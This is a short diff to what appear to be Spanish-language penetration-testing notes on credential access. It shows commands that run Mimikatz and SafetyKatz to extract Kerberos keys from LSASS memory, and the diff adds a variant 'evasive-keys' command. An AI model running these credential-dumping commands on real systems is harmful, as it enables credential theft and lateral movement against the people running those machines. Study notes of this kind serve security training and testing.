@@ -28,7 +28,8 @@ Además de, obtener acceso a credenciales para escalar privilegios o moverse lat
 ❯ .\mimikatz.exe -Command '"sekurlsa::ekeys"'  
 
 # Ejecutar una versión modificada de Mimikatz (SafetyKatz) para extraer desde LSASS las claves Kerberos (AES, RC4, etc.) de los usuarios en memoria 
-❯ .\SafetyKatz.exe "sekurlsa::ekeys" exit        
+❯ .\SafetyKatz.exe "sekurlsa::ekeys" exit   
+❯ .\SafetyKatz.exe "sekurlsa::evasive-keys" exit      
 
 Notes: 
 	1. Desde Kali se puede usar la herramienta de impacket 
